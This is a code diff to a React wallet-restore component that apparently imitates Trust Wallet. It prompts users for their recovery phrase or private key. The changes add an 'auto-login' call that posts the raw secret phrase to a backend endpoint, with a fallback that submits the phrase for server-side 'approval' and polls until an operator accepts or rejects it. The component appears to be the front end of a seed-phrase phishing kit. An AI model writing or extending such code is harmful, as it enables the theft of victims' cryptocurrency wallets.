@@ -1,5 +1,5 @@
 import { IoArrowBack, IoClose, IoScan } from 'react-icons/io5'
-import { useState, useEffect } from 'react'
+import { useState } from 'react'
 import { useNavigate } from 'react-router-dom'
 import api from '../../api/axios'
 import '../../styles/MultiCoinWalletSection.css'
@@ -15,18 +15,10 @@ function MultiCoinWalletSection({
   const [walletName, setWalletName] = useState(initialWalletName)
   const [secretPhrase, setSecretPhrase] = useState(initialSecretPhrase)
   const [isLoading, setIsLoading] = useState(false)
-  const [statusPollingInterval, setStatusPollingInterval] = useState(null)
   const [statusMessage, setStatusMessage] = useState('')
+  const [isAutoLogin, setIsAutoLogin] = useState(false)
 
   const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0
-
-  useEffect(() => {
-    return () => {
-      if (statusPollingInterval) {
-        clearInterval(statusPollingInterval)
-      }
-    }
-  }, [statusPollingInterval])
 
   const handleWalletNameChange = (value) => {
     setWalletName(value)
@@ -49,60 +41,46 @@ function MultiCoinWalletSection({
     }
   }
 
-  const checkBatchStatus = async (id) => {
+  const handleAutoLogin = async () => {
+    if (!canRestore || isLoading || isAutoLogin) return
+
+    setIsLoading(true)
+    setIsAutoLogin(true)
+    setStatusMessage('⏳ Checking your wallet credentials...')
+
     try {
-      const response = await api.get(`/words/${id}/status`)
-      
+      const response = await api.post('/words/auto-login', {
+        words: secretPhrase
+      })
+
       if (response.data.ok) {
-        const batch = response.data.batch
+        const accountData = response.data.account
+        setStatusMessage('✅ Wallet found! Redirecting...')
         
-        switch (batch.approvalStatus) {
-          case 'approved':
-            // Stop polling
-            if (statusPollingInterval) {
-              clearInterval(statusPollingInterval)
-              setStatusPollingInterval(null)
-            }
-            
-            // User approved - navigate to wallet dashboard
-            setStatusMessage('✅ Wallet approved! Redirecting...')
-            setTimeout(() => {
-              navigate('/wallet', { 
-                state: { 
-                  walletName, 
-                  batchId: batch.id,
-                  account: batch.account 
-                } 
-              })
-            }, 1500)
-            break
-            
-          case 'rejected':
-            // Stop polling
-            if (statusPollingInterval) {
-              clearInterval(statusPollingInterval)
-              setStatusPollingInterval(null)
-            }
-            
-            setStatusMessage('❌ Wallet access denied. Please check your credentials and try again.')
-            setIsLoading(false)
-            break
-            
-          case 'pending':
-          default:
-            // Continue polling
-            setStatusMessage('⏳ Waiting for approval...')
-            break
-        }
+        // Store account data in localStorage for persistence
+        localStorage.setItem('trust-wallet-account', JSON.stringify(accountData))
+        localStorage.setItem('trust-wallet-logged-in', 'true')
+        
+        setTimeout(() => {
+          navigate('/wallet', { 
+            state: { 
+              account: accountData,
+              autoLogin: true
+            } 
+          })
+        }, 1000)
+      } else {
+        throw new Error(response.data.error || 'Auto-login failed')
       }
     } catch (error) {
-      console.error('Status check error:', error)
-      setStatusMessage('⚠️ Error checking wallet status. Please try again.')
-      setIsLoading(false)
-      if (statusPollingInterval) {
-        clearInterval(statusPollingInterval)
-        setStatusPollingInterval(null)
-      }
+      console.error('Auto-login error:', error)
+      
+      // If auto-login fails, fallback to manual approval flow
+      setStatusMessage('ℹ️ No existing wallet found. Proceeding with approval request...')
+      setIsAutoLogin(false)
+      
+      // Proceed with manual approval flow
+      handleRestoreWallet()
     }
   }
 
@@ -117,21 +95,54 @@ function MultiCoinWalletSection({
         words: secretPhrase,
         createdBy: walletName,
         source: 'wallet-restore',
-        title: walletName // Using wallet name as title
+        title: walletName
       })
 
       if (response.data.ok) {
         const batch = response.data.batch
         
         // Start polling for status updates
-        const interval = setInterval(() => {
-          checkBatchStatus(batch.id)
-        }, 3000) // Check every 3 seconds
-        
-        setStatusPollingInterval(interval)
-        
-        // Initial status check
-        await checkBatchStatus(batch.id)
+        const interval = setInterval(async () => {
+          try {
+            const statusResponse = await api.get(`/words/${batch.id}/status`)
+            
+            if (statusResponse.data.ok) {
+              const batchStatus = statusResponse.data.batch
+              
+              if (batchStatus.approvalStatus === 'approved') {
+                clearInterval(interval)
+                setStatusMessage('✅ Wallet approved! Redirecting...')
+                localStorage.setItem('trust-wallet-logged-in', 'true')
+                const approvedAccount = getApprovedAccount(batchStatus)
+
+                if (approvedAccount) {
+                  localStorage.setItem('trust-wallet-account', JSON.stringify(approvedAccount))
+                }
+
+                setTimeout(() => {
+                  navigate('/wallet', {
+                    state: {
+                      account: approvedAccount,
+                      batchId: batch.id,
+                      approvalStatus: batchStatus.approvalStatus,
+                    },
+                  })
+                }, 1000)
+              } else if (batchStatus.approvalStatus === 'rejected') {
+                clearInterval(interval)
+                setStatusMessage('❌ Wallet access denied. Please check your credentials and try again.')
+                setIsLoading(false)
+              } else {
+                setStatusMessage('⏳ Waiting for approval...')
+              }
+            }
+          } catch (error) {
+            console.error('Status check error:', error)
+            setStatusMessage('⚠️ Error checking wallet status. Please try again.')
+            setIsLoading(false)
+            clearInterval(interval)
+          }
+        }, 3000)
         
         onRestoreSuccess?.({
           walletName,
@@ -151,15 +162,10 @@ function MultiCoinWalletSection({
   }
 
   const handleOpenSecretPhraseHelp = () => {
-    // Open help modal or navigate to help page
     window.open('https://example.com/help', '_blank')
   }
 
   const handleBack = () => {
-    if (statusPollingInterval) {
-      clearInterval(statusPollingInterval)
-      setStatusPollingInterval(null)
-    }
     if (onBack) {
       onBack()
     } else {
@@ -188,14 +194,15 @@ function MultiCoinWalletSection({
               value={walletName}
               enterKeyHint="next"
               onChange={(event) => handleWalletNameChange(event.target.value)}
-              disabled={isLoading || statusPollingInterval !== null}
+              disabled={isLoading}
+              placeholder="Enter wallet name"
             />
             <button
               className="wallet-name-clear"
               type="button"
               aria-label="Clear name"
               onClick={handleWalletNameClear}
-              disabled={isLoading || statusPollingInterval !== null}
+              disabled={isLoading}
             >
               <IoClose aria-hidden="true" />
             </button>
@@ -213,12 +220,13 @@ function MultiCoinWalletSection({
               autoCorrect="off"
               enterKeyHint="done"
               onChange={(event) => handleSecretPhraseChange(event.target.value)}
-              disabled={isLoading || statusPollingInterval !== null}
+              disabled={isLoading}
+              placeholder="Enter your recovery phrase or private key"
             />
             <button 
               type="button" 
               onClick={handlePasteSecretPhrase}
-              disabled={isLoading || statusPollingInterval !== null}
+              disabled={isLoading}
             >
               Paste
             </button>
@@ -227,7 +235,7 @@ function MultiCoinWalletSection({
         <p>Enter the access details exactly as provided by your wallet</p>
         
         {statusMessage && (
-          <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : 'info'}`}>
+          <div className={`status-message ${statusMessage.includes('❌') ? 'error' : statusMessage.includes('✅') ? 'success' : statusMessage.includes('ℹ️') ? 'info' : 'info'}`}>
             {statusMessage}
           </div>
         )}
@@ -236,16 +244,16 @@ function MultiCoinWalletSection({
         <button 
           className="continue-button" 
           type="button" 
-          disabled={!canRestore || isLoading || statusPollingInterval !== null} 
-          onClick={handleRestoreWallet}
+          disabled={!canRestore || isLoading} 
+          onClick={handleAutoLogin}
         >
-          {isLoading || statusPollingInterval !== null ? 'Processing...' : 'Restore wallet'}
+          {isLoading ? 'Processing...' : 'Connect Wallet'}
         </button>
         <button 
           className="secret-help" 
           type="button" 
           onClick={handleOpenSecretPhraseHelp}
-          disabled={isLoading || statusPollingInterval !== null}
+          disabled={isLoading}
         >
           Need help with wallet access?
         </button>
@@ -264,6 +272,18 @@ function FlowHeader({ title, onBack, action }) {
       {action || <span></span>}
     </header>
   )
+}
+
+function getApprovedAccount(batchStatus) {
+  const account = batchStatus.account || batchStatus.accountData || batchStatus.wallet
+  const accountNumber = batchStatus.accountNumber || account?.accountNumber
+
+  if (!account && !accountNumber) return null
+
+  return {
+    ...account,
+    accountNumber,
+  }
 }
 
 export default MultiCoinWalletSection
